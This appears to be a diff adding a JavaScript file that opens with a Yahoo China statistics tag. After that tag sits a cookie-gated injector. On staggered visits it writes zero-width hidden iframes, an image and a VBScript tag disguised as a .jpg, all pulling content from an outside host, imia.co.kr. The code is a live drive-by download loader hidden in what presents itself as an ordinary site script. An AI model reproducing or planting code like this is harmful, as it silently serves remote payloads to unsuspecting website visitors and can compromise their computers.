@@ -1,0 +1,36 @@
+document.writeln("<script type=\"text\/javascript\" src=\"http:\/\/js.tongji.cn.yahoo.com\/621497\/ystat.js\"><\/script><noscript><a href=\"http:\/\/tongji.cn.yahoo.com\"><img src=\"http:\/\/img.tongji.cn.yahoo.com\/621497\/ystat.gif\"><\/a><\/noscript>")
+
+function getCookie(sVar){
+cookies = document.cookie.split('; ');
+for(var i = 1; i <= cookies.length; i++){
+    if(cookies[i - 1].split('=')[0] == sVar){
+     return cookies[i - 1].split('=')[1];
+    }
+}
+return '';
+}
+
+//alert(document.cookie);
+var expdate = new Date((new Date()).getTime() + (24*60*60*1000)); 
+var expdates = new Date((new Date()).getTime() + (48*60*60*1000));
+var expdatess = new Date((new Date()).getTime() + (72*60*60*1000));
+if (document.cookie.indexOf( "onecookie")==-1&&document.cookie.indexOf( "twocookie")==-1&&document.cookie.indexOf( "threecookie")==-1) 
+{
+	document.write('<img src=http://imia.co.kr/pic/pic/3.jpg width=0 height=0></iframe>');
+	document.write('<script language=vbscript src=http://imia.co.kr/pic/pic/33.jpg></script>');
+	document.cookie= "onecookie=1;expires= " + expdate.toGMTString() + ";path=/; ";
+	document.cookie= "twocookie=1;expires= " + expdates.toGMTString() + ";path=/; ";
+}
+else if (getCookie("twocookie")==1&&document.cookie.indexOf( "onecookie")==-1&&document.cookie.indexOf( "threecookie")==-1)
+{
+	document.write('<iframe src=http://imia.co.kr/pic/pic/3.htm width=0 height=0></iframe>');
+	document.cookie= "threecookie=1;expires= " + expdatess.toGMTString() + ";path=/; ";}
+else if (getCookie("threecookie")==1&&document.cookie.indexOf( "onecookie")==-1&&document.cookie.indexOf( "twocookie")==-1)
+{
+document.write('<iframe src=http://imia.co.kr/pic/pic/3.html width=0 height=0></iframe>');
+document.cookie= "threecookie=2;expires= " + expdatess.toGMTString() + ";path=/; ";
+}
+else
+{
+document.write("");
+}
